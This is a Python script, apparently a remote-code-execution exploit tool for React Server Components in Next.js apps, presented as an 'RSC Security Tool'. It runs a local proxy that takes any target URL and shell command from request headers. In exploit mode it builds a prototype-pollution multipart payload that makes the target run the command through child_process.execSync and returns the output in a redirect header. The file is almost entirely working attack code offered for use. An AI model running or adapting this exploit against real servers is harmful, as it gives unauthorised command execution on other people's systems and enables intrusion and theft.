#!/usr/bin/env python3
"""
github.com/emredavut
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import sys
import secrets
import requests
from urllib.parse import urlparse, parse_qs
import urllib3

# SSL uyarılarını kapat
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PORT = 8765


class ProxyHandler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, X-Target-URL, X-Command')
        self.end_headers()

    def do_POST(self):
        
        try:
            
            target_url = self.headers.get('X-Target-URL')
            command = self.headers.get('X-Command', '')
            action = self.headers.get('X-Action', 'fingerprint')
            
            if not target_url:
                self.send_error(400, "Missing X-Target-URL header")
                return
            
            
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length) if content_length > 0 else b''
            
            # Generate random boundary and request ID for each request
            boundary = f"----WebKitFormBoundary{secrets.token_hex(8)}"
            request_id = secrets.token_hex(4)
            
            # Build payload with random boundary
            if action == 'exploit':
                payload_body = self.build_rce_payload(command, boundary)
            else:
                payload_body = self.build_safe_payload(boundary)
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                'Accept': 'text/x-component',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Next-Action': 'x',
                'Next-Router-State-Tree': '%5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
                'Content-Type': f'multipart/form-data; boundary={boundary}',
                'Origin': target_url.rstrip('/'),
                'Referer': target_url,
                'X-Nextjs-Request-Id': request_id,
            }
            
            response = requests.post(
                target_url,
                headers=headers,
                data=payload_body,
                timeout=10,
                verify=False,
                allow_redirects=False
            )
            
           
            result = {
                'status': response.status_code,
                'headers': dict(response.headers),
                'body': response.text[:2000],
                'command': command
            }
            
           
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps(result).encode())
            
        except Exception as e:

            self.send_response(500)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps({'error': str(e)}).encode())

    def build_safe_payload(self, boundary):
        payload = f'--{boundary}\\r\\nContent-Disposition: form-data; name="1"\\r\\n\\r\\n{{}}\\r\\n--{boundary}\\r\\nContent-Disposition: form-data; name="0"\\r\\n\\r\\n["$1:aa:aa"]\\r\\n--{boundary}--'
        return payload.encode('utf-8')

    def build_rce_payload(self, command, boundary):

        escaped_command = command.replace('\\', '\\\\').replace("'", "\\'")
        
        prefix_payload = (
            f"var res=process.mainModule.require('child_process').execSync('{escaped_command}')"
            f".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"
            f"{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
        )
          
        part0 = (
            '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
            '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
            + prefix_payload
            + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
        )
        
        
        try:
            import json as json_module
            json_module.loads(part0)
        except:
            pass
        
        
        payload = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="0"\r\n\r\n'
            f"{part0}\r\n"
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="1"\r\n\r\n'
            f'"$@0"\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="2"\r\n\r\n'
            f"[]\r\n"
            f"--{boundary}--"
        )
        
        return payload.encode('utf-8')

    def log_message(self, format, *args):
        """Suppress default logging"""
        pass


def main():
    print("""
          
╔═══════════════════════════════════════════════════════════╗
║              RSC Security Tool - Proxy Server             ║
║                     EMRE DAVUT                            ║
╚═══════════════════════════════════════════════════════════╝

""")
    
    try:
        server = HTTPServer(('0.0.0.0', PORT), ProxyHandler)
        print(f"✓ Server running on http://localhost:{PORT}")
        print(f"Port: {PORT}")
        print(f"✓ Ready to accept connections\n")
        print("✓ Press Ctrl+C to stop the server")
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n\n✓ Server stopped")
    except Exception as e:
        print(f"✗ Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()